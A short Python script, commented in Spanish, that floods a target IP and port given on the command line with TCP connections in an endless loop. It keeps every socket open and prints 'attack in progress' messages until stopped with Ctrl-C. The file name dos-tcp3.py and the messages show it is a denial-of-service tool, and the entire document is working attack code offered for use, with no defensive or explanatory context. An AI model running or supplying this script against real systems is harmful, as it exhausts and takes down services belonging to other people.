import socket
import time
import sys
import os

target = sys.argv[1] #args[0] ip que suplanto
port = sys.argv[2] #args[1]

x=-1
tn = list()
print("Ataque en pregreso...")
while True:

	try:
		x+=1

		tn.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))

		tn[x].connect((target, int(port)))

	except KeyboardInterrupt as e2:
		print("INTERRUMPIDO POR TECLADO")
		for i, socket in enumerate(tn):
			socket.close()
		break
		
	except Exception as e:
		os.system("clear")
		print("Ataque en progreso...")
		print("Las conexiones estan siendo rechazadas.")
		print()
		print("Presione Ctrl-C para detener el ataque.")
		#time.sleep(0.2)

#  python C:\Users\rodri\Desktop\modulos\bf-telnet\dos-tcp3.py